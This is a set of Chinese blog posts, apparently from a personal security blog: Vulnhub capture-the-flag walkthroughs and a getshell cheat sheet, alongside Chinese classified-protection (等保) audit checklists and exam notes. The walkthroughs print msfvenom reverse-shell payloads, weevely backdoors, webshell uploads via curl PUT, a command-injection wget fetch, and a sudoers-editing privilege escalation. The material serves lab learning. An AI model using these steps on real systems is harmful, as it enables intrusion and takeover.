[{"title":"Vulnhub|JIS-CTF-VulnUpload-CTF01","url":"/63d10771.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。  \n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码一个登陆界面，没有发现什么。web目录扫描：nikto -h 192.168.xxx.xxx:访问/admin_area，查看源码，拿到flag2及账号密码：访问/uploaded_files，没有发现什么。访问/flag，拿到flag1：访问robots.txt，大致看了一下没有其他发现。用/admin_area找到的账户密码登录系统，发现有上传文件的功能。  \n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\n验证了一下没有限制上传文件的属性，故此时思路是一句话木马-上传-蚁剑连接，或者直接用msf生成反弹shell代码-上传-msf监听。后面试了一下，发现对于上传的文件内容是做了过滤的，尝试了复写、大小写绕过均失败：经过了解之后，发现能使用Linux中的工具weevely生成后门-上传-连接后门：  \n\nweevely  \n\n生成后门weevely generate &lt;password&gt; &lt;path&gt;  \n连接后门weevely &lt;URL&gt; &lt;password&gt; [cmd]  \n\n\n生成后门文件hello.php，上传文件：直接使用weevely连接后门，连接成功：//这里我也不知道原理是啥，按理说上传的文件内容应该也受过滤影响的acat /etc/passwd查看用户列表：ls -a /var/www/html，查看服务器文件:发现hint.txt,cat查看，获得flag3和提示使用technawi登录：发现flag.txt,cat查看，发现没有权限：grep -r &lt;关键字&gt; &lt;目标查找路径&gt;,按提示查找“technawi”相关文件，找到疑似包含密码的文件：cat /etc/mysql/conf.d/credentials.txt查看目标文件，找到flag4和密码：当前用户没有权限直接su切换用户：用ssh试试，登陆成功，能够成功拿到/var/www/html/flag.txt中的flag5：  \n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","weevely"]},{"title":"Vulnhub|SickOs1.1","url":"/4de57e3c.html","content":"0.靶机安装\n不再赘述，可看之前的Vulnhub相关文章。这个靶机安装时如果用的VMware，记得把.mf文件删掉！3.报“403”错误  \n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)、8080(http-proxy)和3128(squid-http)端口。8080是closed状态，先不管它。squid-http可以当作一个http代理服务  \n\n2.(80端口)web安全\nweb访问，查看源代码配置浏览器代理：成功访问，没有发现什么。web目录扫描dirb: dirb http://192.168.117.139 -p 192.168.117.139:3128nikto: nikto -h 192.168.117.139 -useproxy 192.168.117.139:3128访问/robots.txt访问/wolfcms浏览了一下系统，有一个下载文件，下载后打开查看，没有发现什么。继续扫一下目录dirb http://192.168.117.139/wolfcms -p 192.168.117.139:3128也没有发现什么，看网上的思路，直接访问/admin //这里不太明白访问的依据是什么访问/wolfcms/admin,自动跳转到后台登陆界面：尝试了一些常规办法，没有找到账户与密码的相关信息，后发现直接a使用弱口令dmin：admin登陆成功。登陆后类似一个博客管理系统。   \n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\n\nmsfvenom生成反弹shell代码+填入+metasploit监听\n该系统Pages/Edit Page意思能够直接修改php代码，验证一下：验证成功，使用msfvenom生成反弹shell代码：msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;攻击机ip地址&gt; lport=&lt;攻击机监听端口&gt; -o shell.php粘贴到编辑器并保存生效(注意要与原编辑器的内容组成一个完整的&lt;?php?&gt;结构)：metasploit开启监听：getshell成功，转成交互式shell：  \n\n4.提权\nls -a发现配置文件config.php,cat查看：找到数据库使用的是mysql，数据库名wolf，用户名root，密码john@123：直接用root：john@123这套账户密码su和ssh都登陆失败。cat /etc/passwd查看一些用户列表，发现用户sickos，用它尝试登陆一下：登陆成功，sudo -i切换为root，提权成功。  \n\n\nsudo -i：Linux终端命令下改变用户对命令使用权限的命令。获得的是root用户的环境。  \nsudo -s：执行环境变量中的 SHELL 所指定的 shell，或是 /etc/passwd 里所指定的 shell 。获得的是本身用户的环境。  \n\n\n进入/root，拿flag:  \n\n","categories":["渗透测试"],"tags":["Vulnhub","反弹shell","提权","Metasoploit","Msfvenom"]},{"title":"命令","url":"/8c54db8b.html","content":"服务器Linux1.身份鉴别\n1.1 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换。    \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/passwd\n记录用户属性，包括用户名、密码、用户标识、组标识等\n无空口令用户\n\n\n/etc/shadow\npasswd中不再直接记录口令，将shadow作为真正的口令文件(需root权限)\n无空口令用户\n\n\n/etc/login.defs\n(默认)登陆程序的配置文件,可配置密码参数\n存在密码的设置\n\n\n/etc/pam.d/system-auth  (Redhat、CentOS和Fedora)\n优先级高于login.defs\n\n\n\n/etc/pam.d/common-passwd  (Debian、Ubuntu和LinuxMint)\n优先级高于login.defs\n\n\n\n1.2 应具有登陆失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/login.defs\n(默认)登陆程序的配置文件,可配置密码参数\n本地登陆失败处理：%auth required pam_tally2.so onerr=fail deny=5 unlock_time=300 even_deny_root root_unlock_time=10%;远程登陆失败处理：%auth required pam_tally2.so onerr=fail deny=5 unlock_time=300 even_deny_root root_unlock_time=10%\n\n\n/etc/pam.d/system-auth  (Redhat、CentOS和Fedora)\n优先级高于login.defs\n\n\n\n/etc/pam.d/common-passwd  (Debian、Ubuntu和LinuxMint)\n优先级高于login.defs\n\n\n\n/etc/profile\n配置了超时锁定参数\nTIMEOUT=300s\n\n\n\n1.3 当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nservice -status-all &#124; grep sshd\n查看是否运行了sshd服务\n应运行\n\n\nnetstat -an &#124; grep 22\n查看相关端口是否已打开\n应打开\n\n\nservice –status-all &#124; grep running\n查看是否使用Telnet\n应未使用Telnet\n\n\n\n1.4 应采用双因子认证。  \n\n2.访问控制\n2.1 应对登录的用户分配账户的权限。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nls -a &lt;目录名或文件名&gt;\n(r,4)(w,2)(x,1)(-,0)\n配置文件≤644；可执行文件≤755\n\n\n\n2.2 应重命名或删除默认账户，修改默认账户的默认口令。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/shadow\n查看是否存在adm、lp、shutdown、halt、mail、uucp、games、ftp等默认无用账户\n应不存在\n\n\n/etc/ssh/sshd_config\n参数PermitRootLogin是否为no\n应为no，表示不允许root远程登陆\n\n\n\n2.3 应及时删除或停用多余的、过期的账户，避免共享账户的存在。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/shadow\n查看是否存在adm、lp、shutdown、halt、mail、uucp、games、ftp等默认无用账户\n应不存在\n\n\n\n2.4 管理用户权限分离&amp;最小权限原则。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/passwd\n查看非默认账户\n管理用户权限分离，权限应符合最小权限原则\n\n\n/etc/sudoers\n查看有哪些用户能够使用sudo命令授予其他用户root权限\n应只有root\n\n\n\n2.5 应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则。2.6 访问控制的粒度达到主体为用户级或进程级，客体为文件、数据库表级。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nls -a &lt;目录名或文件名&gt;\n(r,4)(w,2)(x,1)(-,0)\n配置文件≤644；可执行文件≤755\n\n\n\n2.7 应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/selinux/config\n参数SELinux(enforcing/permissive/disabled)\nLinux默认关闭SELinux，或者已使用第三方主机加固系统或对系统内核进行了二次开发加固(需实际查看系统可视化界面)\n\n\n\n\n3.安全审计\n3.1 应启用安全审计功能，审计覆盖到每个用户，对重要的用户行为和重要安全事件进行审计。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nservice auditd status\n是否开启审计进程\n应开启，若无则应部署了第三方安全审计工具\n\n\nps -ef &#124; grep auditd\n是否开启安全审计的守护进程\n应开启\n\n\n/etc/audit/audit.rules\n安全审计配置文件\n记录了文件和底层调用信息，记录的安全事件较为全面\n\n\n\n3.2 审计记录应包括事件的日期和时间、用户、事件类型、时间是否成功及其他与审计相关的信息。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nausearch -ts today\n查看今天以后的日志\n审计记录包括事件的日期、时间、类型、主体标识、客体标识和结果\n\n\ntail -20 /var/log/audit/audit.log\n查看审计日志\n审计记录包括事件的日期、时间、类型、主体标识、客体标识和结果\n\n\n\n3.3 应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等。3.4 应对审计进程进行保护，防止未经授权的中断。  \n\n4.入侵防范\n4.1 应遵循最小安装的原则，仅安装需要的组件和应用程序。   \n\n\n\n命令\n注释\n预期\n\n\n\n\nyum list installed\n查看已安装的程序包\n其中应无当前不需要使用的组件和应用程序\n\n\n\n4.2 应关闭不需要的系统服务、默认共享和高危端口。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nservice –status-all &#124; grep running\n查看多余的网络服务是否关闭\n应关闭\n\n\nnetstat -ntlp\n查看是否关闭非必须的端口\n应关闭\n\n\n\n4.3 应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n/etc/hosts.deny\n访问本机ip黑名单\n应有”ALL:ALL”\n\n\n/etc/hosts.allow\n访问本机ip白名单\n应有”sshd:192.168.xxx.xxx/255.255.255.0”\n\n\n\n4.4 应能发现可能存在的已知漏洞，并在经过充分测试评估后，及时修补漏洞。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nrpm -qa &#124; grep patch\n查看补丁安装情况\n补丁更新时间为最近。已对补丁进行控制和管理。\n\n\n\n4.5 应能够检测到对重要节点进行入侵的行为，并在发生严重入侵事件时提供报警。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nfind /-name -print\n查看是否安装了主机入侵检测软件\n应有安装\n\n\n\n\n5.恶意代码防范\n5.1 应采用免受恶意代码攻击的技术措施或主动免疫可信验证机制及时识别入侵和病毒行为，并将其有效阻断。  \n\n6.可信验证\n6.1 可基于可信根对通信设备的系统引导程序、系统程序、重要配置参数和应用程序等进行可信验证，并在应用程序的关键执行环节进行动态可信验证，在检测到其可信性受到破坏后进行报警，并将验证结果形成审计记录送至安全管理中心。  \n\n数据库Oracle1.身份鉴别\n1.1 应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂度要求并定期更换。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect limit from dba_profiles where profile=“DEFAULT” and resource_name=“PASSWORD_VERIFY_FUNCTION”\n口令复杂度函数\n不为UNLIMITED\n\n\nutlpwdmg.sql文件的“–Check for the minimum length of the password”部分\n口令最小长度规则\n”length(password)&lt;”后的值≥8\n\n\nselect limit from dba_profiles where profile=“DEFAULT” and resource_name=“PASSWORD_LIFE_TIME”\n口令过期时限\n不为UNLIMITED\n\n\n\n1.2 应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect limit from dba_profiles where profile=“DEFAULT” and resource_name=“FAILED_LOGIN_ATTEMPTS”\n登陆失败次数\n不为UNLIMITED\n\n\nselect limit from dba_profiles where profile=“DEFAULT” and resource_name=“FAILED_LOCK_TIME”\n登陆失败口令锁定时间\n不为UNLIMITED\n\n\nselect limit from dba_profiles where profile=“DEFAULT” and resource_name=“IDLE_TIME”\n登陆超时退出时长\n不为UNLIMITED\n\n\n\n1.3 当进行远程管理时，应采取必要的措施防止鉴别信息在网络传输过程中被窃听。  \n\n\n\n命令\n注释\n预期\n\n\n\n\n执行lsnrctl status &lt;监听器名&gt; 或 查看文件$ORACLE_HOME/network/admin/listener.ora中LISTERENR的PROTOCAL和PORT\n服务端Oracle监听器监听的网络协议，应启用SSL加密\nprotocol(TCPS);port(2484)\n\n\n查看文件$ORACLE_HOME/network/admin/tnsnames.ora中LISTERENR的PROTOCAL和PORT\n客户端应启用SSL加密\nprotocol(TCPS);port(2484)\n\n\n查看文件$ORACLE_HOME/network/admin/sqlnet.ora中WALLET_LOCATION、SQLNET.AUTHENTICATION_SERVERS、SSL的相关配置\n服务端和客户端的配置文件\n应有SSL的相关配置\n\n\n查看文件$ORACLE_HOME/network/admin/sqlnet.ora中SQLNET.ENCRYPTION_SERVER;SQLNET.ENCRYPTION_TYPES_SERVER。SQLNET.CRYPTO_CHECKSUM_SERVER;SQLNET.CRYPTO_CHECKSUM_TYPES_SERVER\nSQLNET.ENCRYPTION_SERVER–required；SQLNET.ENCRYPTION_TYPES_SERVER–此处指定的加密算法应不为已被证明不安全的算法，如DES、3DES。  SQLNET.CRYPTO_CHECKSUM_SERVER–required；SQLNET.CRYPTO_CHECKSUM_TYPES_SERVER–此处指定的加密算法应不为已被证明不安全的算法，如DES、3DES。\n\n\n\n1.4 双因子认证。  \n\n2.访问控制\n2.1 应对登录的用户分配账户和权限。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect * from dba_users\ndba_users策略\nMGMT_UIEW、SYS、SYSTEM、DBSNMP、SYSMAN为启用状态，其他均为锁定状态\n\n\n\n2.2 应重命名或删除默认账户，修改默认账户的默认口令。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect * from dba_users\ndba_users策略\nSYS口令应不为CHANGE_ON_INSTALL;SYSTEM口令应不为MANAGER;DBSNMP口令应不为DBSNMP\n\n\n\n2.3 应及时删除或停用多余的、过期的账户，避免共享账户的存在。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect username,account_status from dba_users\ndba_users策略\n返回结果应不存在范例账号scott、outln、ordsys,过期账户account_status=expired,返回结果应一一对应\n\n\n\n2.4 应授予管理用户所需的最小权限，实现管理用户的权限分离。2.5 应由授权主题配置访问控制策略，访问控制策略规定主体对客体的访问控制规则。2.6 访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级。2.7 应对重要主体和客体设置安全标记，并控制主体对有安全标记信息资源的访问。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect username from dba_users\ndba_users策略\n应安装Oracle Label Security模块：返回用户中存在LBACSYS\n\n\nselect policy_name,status from DBA_SA_POLICIES\n策略创建情况\n存在status=enable的标签策略\n\n\nselect * from dba_sa_levels ORDER BY level_num\n级别创建情况\n查询结果不为空\n\n\nselect * from dba_sa_labels\n标签创建情况\n查询结果不为空\n\n\nselect * from dba_sa_tables_policies\n了解用于存储重要数据的表的名称\n查询结果不为空，且包含重要数据所在表的名称\n\n\n\n\n3.安全审计\n3.1 应启用安全审计功能，审计覆盖到每个用户，对重要用户行为和重要安全事件进行审计。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nselect value from v$parameter where name=’audit_trail’\n查看是否开启审计功能\naudit_trail 不为 none\n\n\n\n3.2 审计记录应包括事件的日期和时间、用户、事件类型、事件是否成功及其他与审计相关的信息。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nSQL&gt;show parameter background_dump_dest\n查询日志文件位置\n（默认）$ORACLE/rdbms/log\n\n\nSQL&gt;select log_mode,force_logging from v$database;\n查询数据库的日志记录模式\n不全为NO，存在记录某一级别的日志\n\n\nSQL&gt;select tablespace_name,logging,force_logging from db_tablespaces;\n查询表空间的日志记录模式\n不全为NO，存在记录某一级别的日志\n\n\nSQL&gt;select table_name,logging from user_tables;\n查询对象的日志记录模式\n不全为NO，存在记录某一级别的日志\n\n\n\n3.3 应对审计记录进行保护，定期备份，避免受到未预期的删除、修改或覆盖等。3.4 应对审计进程进行保护，防止未经授权的中断。  \n\n\n\n命令\n注释\n预期\n\n\n\n\nalter system set audit_trail=none\n关闭审计进程\n除审计人员外，其他人无法对审计进程进行开启关闭\n\n\n\n\n4.入侵防范\n4.1 最小安装原则。4.2 应通过设定终端接入方式或网络地址范围对通过网络进行管理的管理终端进行限制。   \n\n\n\n命令\n注释\n预期\n\n\n\n\n查看sqlnet.ora文件中tcp.validnode_checking和tcp.invited_nodes\n启用相应配置\ntcp.validnode_checking=yes；tcp.invited_nodes参数已配置IP地址列表\n\n\n\n4.3 应提供数据有效性校验功能，保证通过人机接口输入或通过通信接口输入的内容符合系统设定要求。   \n\n\n\n命令\n注释\n预期\n\n\n\n\n–cd $ORACLE_HOME/Opatch opatch lsinventory\n了解Oracle数据库的补丁升级机制\nOPatch和OUI的版本较新\n\n\n\n\n","categories":["等保测评/初级考试"],"tags":[]},{"title":"Vulnhub|SickOs1.2","url":"/d4ec2f86.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：1.靶机安装后无ip  \n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码打开是一张图片blow.jpg。查看是否隐写，strings &lt;图片所在路径/文件名&gt; 没有发现什么。dirb扫描web目录dirb http://192.168.xxx.xxx //这里用nikto扫不到，不晓得为啥:访问http://192.168.xxx.xxx/test ,找到版本信息:上网搜版本漏洞，没有发现什么。查看/test目录支持的方法：nmap --script http-methods --script-args http-methods.url-path=&#39;/test&#39; 192.168.xxx.xxx  //还有很多其他方法具有潜在风险且可利用的method：验证可用PUT上传文件：  \n\n这里总是失败，报403，后发现是3.报“403”错误   \n\n1.BurpSuite：拦截请求，修改请求头与请求报文：2.nmap nmap 192.168.xxx.xxx -p 80 --script http-put --script-args http-put.url=&#39;/test/&lt;php文件名&gt;&#39;,http-put.file=&quot;&lt;php文件名&gt;&quot;&gt;3.curl curl -T &lt;php文件名&gt; http://192.168.xxx.xxx/test/ \n\ncurl上传出现417错误：需要在curl的参数中加上特定的HTTP Header Expect:，即将Header中Expect的值手动指定为空。  \n\n\n3.getshell\n\n2021-12-03发布的getshell相关文章getshell   \n\nA) 一句话木马+蚁剑+/usr/share/webshells/php/php-reverse-shell.phpPUT一句话木马：蚁剑连接成功：上传kali自带的反弹shell代码/usr/share/webshells/php/php-reverse-shell.php，方便后续操作：修改php-reverse-shell.php：通过蚁剑上传到/test目录下：攻击机开启端口监听nc -nvlp 443，在浏览器访问/test/php-reverse-shell.php。B) msfvenom生成反弹shell代码+PUT/上传+metasploit监听生成反弹shell：msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;攻击机ip&gt; lport=&lt;攻击机监听端口：443&gt; -o shell.phpcurl上传：curl -T &lt;反弹代码所在路径/shell.php&gt; -H &#39;Expect:&#39; &quot;http://192.168.xxx.xxx/test/&quot;metasploit监听443：getshell成功，转为交互式shell：  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权：需要用户密码-失败。尝试suid提权：没有找到可行文件-失败。尝试在/etc/passwd添加用户：可写文件里没有/etc/passwd-失败。查看/etc/cron*下所含的所有文件ls la /etc/cron*:发现/etc/cron.daily文件下，root使用chkrootkit工具。  \n\nA)直接使用searchsploit chkrootkit查看说明文档 cat usr/share/exploitdb/linux/local/33899.txt按说明文档执行：利用chkrootkit，添加当前用户www-data到sudoers列表中：  \n\n/etc/sudoers 该文件允许特定用户像root用户一样使用各种各样的命令，而不需要root用户的密码。  \n\necho &#39;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL)NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#39; &gt; /tmp/updatesudo -i提权成功:  \n\nsudo -i：Linux终端命令下改变用户对命令使用权限的命令。获得的是root用户的环境。  \nsudo -s：执行环境变量中的 SHELL 所指定的 shell，或是 /etc/passwd 里所指定的 shell 。获得的是本身用户的环境。  \n\n   \n\n\nB)使用msf搜索exp：使用exp需要先获得一个session，重新用msf监听443，获取shell后，background返回上一层，成功获得一个session：使用chkrootkit的exp：提权成功，拿flag：  \n\n\n","categories":["渗透测试"],"tags":["Vulnhub","反弹shell","提权","Metasoploit","Msfvenom","http-methods"]},{"title":"Vulnhub|Questions","url":"/238e957d.html","content":"1.靶机安装后无ip\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：  \n1.启动靶机时按shift，进入配置界面，修改配置信息：2.ip a查看网卡信息，可以看到靶机没有成功地被分配到ip，记住网卡名称ens33：3.vim /etc/network/interfaces看一下配置信息用的是哪一个网卡，把它们都改为ens33：/etc/init.d/networking/interfaces重启网卡后，重新启动靶机。\n\n\n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n2.css加载异常&amp;url重定向\n解决办法：将目标靶机ip地址设定为localhost vi /etc/hosts：  \n\n3.报“403”错误\n解决办法：（若用的VMware）把靶机部署文件中的.mf文件删掉！！\n\n","categories":["渗透测试"],"tags":["Vulnhub"]},{"title":"Vulnhub|Os-Hax","url":"/9c45f9e.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：1.靶机安装后无ip  \n\n此时靶机启动后，在攻击机上进行主机扫描时应能扫描到。\n\n1.信息收集\n主机扫描nmap扫描nmap -sn 192.168.xxx.0/24靶机开放了22(ssh)和80(http)端口。  \n\n2.(80端口)web安全\nweb访问，查看源代码dirb扫描web目录dirb http://192.168.xxx.xxx :访问http://192.168.117.135/html 没有什么有用信息:访问http://192.168.117.135/img 发现flaghost.png，打开发现没有明示什么有用的信息：下载下来，进一步查看是否进行了图片隐写strings &lt;文件名&gt;发现疑似密码的字符串：访问http://192.168.117.135/wordpress ：  \n\n页面的css样式没有加载出来，并且点击功能切换页面时，url会重定向到localhost：  \n解决办法：2.css加载异常&amp;url重定向   \n\n使用wpscan扫描:  \n\nwpscan是一款专门针对WordPress安全扫描器  \n\n\n\n\n功能\n命令\n\n\n\n\n扫描安装的插件\nwpscan –url http://192.168.xxx.xxx/wordpress –enumerate p\n\n\n扫描安装的插件的漏洞\nwpscan –url http://192.168.xxx.xxx/wordpress –enumerate vp\n\n\n枚举wordpress的用户\nwpscan –url http://192.168.xxx.xxx/wordpress –enumerate u\n\n\n\n发现一个用户web：结合上面发现的疑似密码字符串passw@45，尝试登陆，登陆失败：尝试取回口令，失败：查阅网上dalao的思路，发现这是一个目录……进入http://192.168.117.135/passw@45 发现flag2以及hostconfigure ：flag2内容是经过brainfuck加密的，解密得到账户密码：登陆后，发现该账户拥有超管权限：  \n\n3.getshell\n\n2021-12-03发布的提权相关文章getshell   \n\n3.1 msfvenom生成反弹shell代码msfvenom -p php/meterpreter/reverse_tcp lhost=&lt;攻击机ip地址&gt; lport=&lt;攻击机监听端口&gt; -o shell.php3.2.1 该系统的/Appearance/theme editor下可直接修改php代码，故可在此填入：将msfvenom生成的反弹shell代码粘贴到某一个php编辑器中（要把首部的‘/*’去掉） ，上传：3.2.2 该系统的/Activity monitor存在Command Injection漏洞，可借此wget 反弹shell代码来反弹shell：  \n\n验证存在Command Injection漏洞：192.168.xxx.xxx|id  \n\n192.168.xxx.xxx|wget &lt;反弹shell所在路径/shell.php&gt;3.3 打开metasploit监听：\n\n注意：此处的lhost与lport必须是攻击机的ip与端口，即与3.1 msfvenom生成反弹shell代码配置的一样   \n\n3.4访问http://192.168.117.135/wordpress,getshell成功：获取交互式shell：python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;切换用户web登录，登陆成功：反思|前面获得一个账户密码的时候就应该尝试ssh，若能登录则无需反弹shell的内容由sh切换为bash：/bin/bash  \n\n/bin/sh与/bin/bash的区别  \n\nsh一般设成bash的软链(symlink)ls -l /bin/sh  \nlrwxrwxrwx 1 root root 4 Sep 14 04:45 /bin/sh -&gt; bash    \n在一般的Linux系统当中（例外如FreeBSD，OpenBSD等），使用sh调用执行脚本相当于打开了bash的POSIX标准模式。  \n也就是说 /bin/sh 相当于 /bin/bash –posix   \n\n\n查看系统用户 cat /etc/passwd:进入/home，有两个用户文件夹：进入/user-a，没有发现什么。进入/web，发现flag3：  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权  \n\n尝试sudo提权：利用awk：sudo /usr/bin/awk &#39;&#123;system(&quot;/bin/bash&quot;)&#125;&#39;提权成功，进入/root寻找最后一个flag：\n\n","categories":["渗透测试"],"tags":["Vulnhub","反弹shell","提权","Metasoploit","Msfvenom"]},{"title":"概念","url":"/be97aa85.html","content":"等保2.0安全通信网络层面 三级系统应提供什么的硬件冗余，保证系统的可用性：通信线路、关键网络设备、关键计算设备  \n等保三级中，恶意代码应该在哪里进行检测和清除：网络边界  \n第几级开始增加“抗抵赖性”的要求：第三级  \n三级系统网络安全的设备防护有几个检查项：8个（安全通信网络）  \n恶意代码应该在哪里进行检测和清除：网络边界  \n三级系统中，MS SQLserver的审核级别为：全部  \n等级保护工作有几项规定动作：5项：定级-备案-建设整改-等级测评-监督检查信息安全等级保护的首要环节是：定级/备案信息安全等级保护的关键是：建设整改使信息系统保护能力不断提高的保障是：监督检查  \n定级工作流程一般有几项：5项：确定定级对象-初步确定等级-专家评审-主管部门审核-备案审核定级过程中，初步确定等级为哪一级可自行确定最终保护等级：第一级网络运营者应当在哪个阶段确定网络的安全保护等级：规划设计阶段第二级以上的系统，网络运营者应当在网络的安全保护等级确定后10个工作日内，到县级以上公安机关报备。  \ncisco的配置通过什么协议备份：TFTP\n功能测试不能实现什么功能：全局访问控制策略  \n开展主机工具测试所必需了解的信息：操作系统、应用、ip  \n用户登录路由器的主要方式有：利用控制台端口、利用MODEM、VTY  \n超时自动断连：(Cisco)exec-timeout；(华为)idle-timeout  \n隔离技术中，安全性最好的是：物理隔离  \nWindows系统默认terminal services服务所开放的端口为：3389  \n","categories":["等保测评/初级考试"],"tags":[]},{"title":"“差异”题","url":"/e0b816a7.html","content":"三级与二级的差异\nQ:《基本要求》中，在应用安全层面的访问控制要求中，三级系统较二级系统增加的措施有哪些？A:1）应由授权主体配置访问控制策略，访问控制策略规定主体对客体的访问规则。2）访问控制的粒度应达到主体为用户级或进程级，客体为文件、数据库表级。3）应对重要的主体和客体设置安全标记，并控制主体对有安全标记的信息资源的访问。\n\n\nQ:二级中，应根据会话状态信息数为数据流提供明确的允许或拒绝访问能力，控制粒度为网段级？A:正确  \n\n《基本要求》/安全区域边界/访问控制：三级应对进出网络的数据流实现基于应用协议和应用内容的访问控制。\n三级为端口级，二级为网段级。  \n\n\n\nQ:应用层软件软件的容错，三级比二级多了什么要求？A:应提供自动保护功能，当故障发生时自动保护当前所有状态，保证系统能够进行恢复。  \n\n《基本要求》/安全计算环境/数据备份与恢复(三级与二级的差异)：应提供异地实时备份功能，利用通信网络将重要数据实时备份至备份场地。应提供重要数据处理系统的热冗余，保证系统的高可用性。\n\n\n等保2.0与1.0的差异\nQ:等保1.0和等保2.0的区别？A:    \n\n\n\n等保\n2.0\n1.0\n\n\n\n\n名称\n《信息安全技术网络安全等级保护基本要求》\n《信息安全技术系统安全等级保护基本要求》\n\n\n定级对象\n信息系统、基础信息网络、云计算平台、大数据平台、物联网系统、工业控制系统、采用移动互联技术的网络等\n信息系统\n\n\n安全要求\n安全通用要求与安全扩展要求\n安全要求\n\n\n措施分类结构变化\n技术： 安全物理环境、安全通信网络、安全区域边界、安全计算环境、安全管理中心 管理： 安全管理制度、安全管理机构、安全管理人员、安全建设管理、安全运维管理\n技术： 物理安全、网络安全、主机安全、应用安全、数据安全 管理： 安全管理制度、安全管理机构、人员安全管理、系统建设管理、系统运维管理\n\n\n内容变化\n定级-备案-建设整改-等级测评-监督检查+新的安全要求(风险评估、安全监测、通报预警、态势感知等)\n定级-备案-建设整改-等级测评-监督检查\n\n\n\n\n\nQ:等保2.0重点强调的关键技术包括？A:可信计算技术、强制访问控制、审计追查技术、结构化保护技术、多级互联技术  \n\n\nQ:等保2.0的“一个中心，三重防护”，分别指的是什么？A：“一个中心”指“安全管理中心”；“三重防护”指“通信网络防护”“区域边界防护”“计算环境防护”。  \n\n\nQ:等保2.0建设核心思想是什么？A:1）以可信认证为基础，构建一个可信的业务系统执行环境2）以访问控制技术为核心，实现主体对客体的受控访问3）构建集中管控、最小权限管理与三权分立的管理平台  \n\n","categories":["等保测评/初级考试"],"tags":[]},{"title":"getshell","url":"/75811fbe.html","content":"获取shell\n1.爆破  \n\n优先使用条件: 获得有限的账户池与密码池使用实例：Vulnhub|Me and My Girlfriend\n\n2.利用Metasoploit\n\n优先使用条件：获得使用内容的版本信息使用实例：Vulnhub|Os-hackNos\n\n3.反弹shell  \n\n优先使用条件：1.有填入并上传php代码的交互  \n\n(msfvenom生成反弹shell代码+填入+metasploit监听)使用实例：Vulnhub|Os-Hax  \n\n2.能够PUT/上传php代码  \n\n(msfvenom生成反弹shell代码+PUT/上传+metasploit监听)  \n(一句话木马+蚁剑+/usr/share/webshells/php/php-reverse-shell.php)使用实例：Vulnhub|SickOs1.2  \n\n\n\n获取交互式shell\n\npython\n\n\nsudo  python -c 'import pty;pty.spawn(\"/bin/sh\")'  //python&lt;3\npython3 -c 'import pty;pty.spawn(\"/bin/sh\")'\n\n\n\n\n待续\n\n","categories":["渗透测试"],"tags":["getshell"]},{"title":"Vulnhub|Os-hackNos","url":"/a8b692c1.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内。\n\n这里配置完了之后发现nmap不到靶机的ip。\n解决办法：\n1.启动靶机时按shift，进入配置界面，修改配置信息：2.ip a查看网卡信息，可以看到靶机没有成功地被分配到ip，记住网卡名称ens33：3.vim 